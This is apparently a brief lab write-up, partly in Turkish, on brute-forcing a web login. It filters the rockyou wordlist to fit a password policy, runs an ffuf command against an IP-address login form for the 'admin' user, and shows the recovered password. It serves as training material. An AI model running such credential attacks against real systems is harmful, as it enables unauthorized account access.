# Brute Forcing Passwords

## Password Policy

* En az 1 büyük harf
* En az 1 küçük harf
* En az 1 rakam
* En az 10 karakter

```sh
my@attack:~$ cat /usr/local/share/wordlists/rockyou.txt | grep -E '[[:upper:]]' | grep -E '[[:lower:]]' | grep -E '[[:digit:]]' | grep -E '^.{10,}$' > passwords_filtered.txt
```

## Attacking

!!! warning

    Burada admin kullanıcı adı kullanıldı.

```sh
my@attack:~$ ffuf -ic -X POST -w passwords_filtered.txt:FUZZ -u "http://94.237.54.42:54230" -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=FUZZ' -fr "Invalid username or password"
```

```output title="Output"
Ramirez120992           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 110ms]
```
